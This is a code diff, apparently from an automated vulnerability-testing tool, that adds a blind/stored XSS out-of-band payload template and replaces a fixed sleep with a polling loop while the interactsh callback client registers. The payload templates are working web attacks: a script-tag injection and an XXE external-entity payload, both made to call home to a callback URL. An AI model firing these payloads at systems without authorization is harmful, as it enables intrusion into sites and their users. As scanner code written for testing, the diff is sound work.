@@ -127,6 +127,15 @@ _DEFAULT_TEMPLATE: dict[str, str] = {
     "ssti": "{OOB_URL}",
     "rce": "{OOB_URL}",
     "insecure_deserialization": "{OOB_URL}",
+    # Blind / stored XSS: a script that calls home when a victim/admin renders the
+    # stored value in a context the attacker can't see (moderation queue, admin panel,
+    # support-agent view). The canary HTTP hit confirms it fired. NOTE: the fire is
+    # often SECOND-ORDER — it happens when the victim next views the page, which may be
+    # long after this test's poll window; `no_callback_this_run` therefore stays
+    # `testing` (never `ruled_out`) and the canary host is recorded so a delayed hit can
+    # still be attributed. Agents can override with an `<img>`/`fetch()`/attribute-break
+    # variant via `payload_template` to fit the injection context.
+    "xss": '"><script src="{OOB_URL}"></script>',
     "xxe": (
         '<?xml version="1.0"?>\n'
         '<!DOCTYPE r [<!ENTITY % x SYSTEM "{OOB_URL}"> %x;]>\n'
@@ -345,11 +354,22 @@ class _InteractshProvider:
         if self._token:
             argv += ["-token", self._token]
         inner = " ".join(_shq(a) for a in argv)
+        boot = _shq(self._outfile + ".boot")
+        # Poll the boot output for the registered-domain line (token + >=2-label
+        # server domain) instead of a fixed sleep: interactsh registration needs a
+        # round-trip to the OAST server, which on a slow/flaky network can take well
+        # over a few seconds — a fixed short wait would read an empty file and make OOB
+        # silently unavailable. Breaks early when the domain appears (~fast path), caps
+        # at ~13.5s. The grep's two-dot pattern matches both public (token.oast.me) and
+        # self-hosted (token.srv.example.com) domains and skips the static
+        # "projectdiscovery.io" banner line (one dot).
         script = (
-            f"nohup {inner} > {_shq(self._outfile + '.boot')} 2>&1 &\n"
+            f"nohup {inner} > {boot} 2>&1 &\n"
             f"echo $! > {_shq(self._outfile + '.pid')}\n"
-            "sleep 4\n"
-            f"cat {_shq(self._outfile + '.boot')}\n"
+            "for _ in $(seq 1 9); do "
+            f"grep -qiE '[a-z0-9]{{10,}}\\.[a-z0-9.-]+\\.[a-z]{{2,}}' {boot} 2>/dev/null "
+            "&& break; sleep 1.5; done\n"
+            f"cat {boot}\n"
         )
         _code, out, _timed = await _exec(
             self._t, "sh", "-lc", script, timeout=_ALLOC_TIMEOUT_S
